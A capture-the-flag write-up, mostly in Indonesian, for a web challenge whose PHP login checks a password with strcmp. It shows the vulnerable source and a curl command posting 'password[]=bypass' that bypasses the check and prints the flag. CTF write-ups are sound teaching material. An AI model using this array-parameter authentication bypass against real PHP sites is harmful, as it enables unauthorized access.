<h1><b>See the source</h1></b>
<pre>
We were sipping coffee in SDSLabs when I got a mail from a friend of mine. 
He had a small challenge for us. He wanted us to hack into his web page and find the flag. 
That fool even gave us part of the source code for his page. 
It was merely cakewalk for us thereafter. See if you can find the flag.

<a href='http://hack.bckdr.in:16014/'>Here</a> is the link for the webpage and <a href='http://hack.bckdr.in:16014/src.txt'>here</a> is the link of the source.
</pre>
</b><h3>Solution</h3></b>
<p>Pada soal kita diberikan source php</p>

```php
<?php
	include("flag.php");

	$error = 0;

	if(isset($_POST['password']))
	{	$password = $_POST['password'];
		if(strcmp($password, $actual_password)==0)
		{
			echo "You have successfully authenticated!<br>";
			echo "Flag : ".$flag;
			die;
		}
		else
			$error = 1;
	}
?>
```
<p>Pada eksekusi program diatas terdapat fungsi strcmp yaitu pembanding string, dan itu terdapat pada statment password yang kita input dengan password pada database</p>
<p>strcmp itu beroperasi seperti jika kita compare string1 dengan string2 bernilai = 0 maka string tersebut sama, dan bernilai besar dari 0 jika berbeda</p>
<p>string compare dapat dibypass dengan menambah buka dan tutup kurung siku pada variabel name, seperti eksekusi dengan curl dibawah ini</p>

```console
root@Python:/home/venom/Downloads# curl --data "password[]=bypass" http://hack.bckdr.in:16014/
You have successfully authenticated!<br>Flag : b0a524a10572548e34b025471a023b4aea220f7b202f422f7b5d5c68592c8faa
root@Python:/home/venom/Downloads# 
```

</b><h3>Flag</h3></b>
<pre>
b0a524a10572548e34b025471a023b4aea220f7b202f422f7b5d5c68592c8faa
</pre>
